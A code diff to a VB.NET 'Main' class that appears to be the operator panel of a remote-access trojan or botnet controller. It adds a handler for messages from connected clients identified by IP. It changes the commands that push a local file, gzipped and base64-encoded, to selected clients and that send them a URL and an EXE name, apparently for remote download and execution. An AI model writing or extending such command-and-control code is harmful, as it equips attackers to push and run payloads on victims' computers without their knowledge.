@@ -795,6 +795,12 @@ Public Class Main
                     Exit Select
 #End Region
 
+#Region "Messages"
+                Case "MSG"
+                    Messages(u.IP.Split(":")(0), A(1))
+                    Exit Select
+#End Region
+
             End Select
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Exclamation)
@@ -1223,7 +1229,7 @@ Public Class Main
 
         If o.ShowDialog = Windows.Forms.DialogResult.OK Then
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "RD-" & SPL & o.FileName & SPL & Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)) & SPL & "update")
+                S.Send(x.Tag, "CL-" + SPL & "4" + SPL + IO.Path.GetFileName(o.FileName) + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
             Next
         End If
     End Sub
@@ -1237,7 +1243,7 @@ Public Class Main
             Exit Sub
         Else
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "RU-" & SPL & URL & SPL & EXE & SPL & "update")
+                S.Send(x.Tag, "CL-" + SPL + "5" + SPL + URL + SPL + EXE)
             Next
         End If
     End Sub
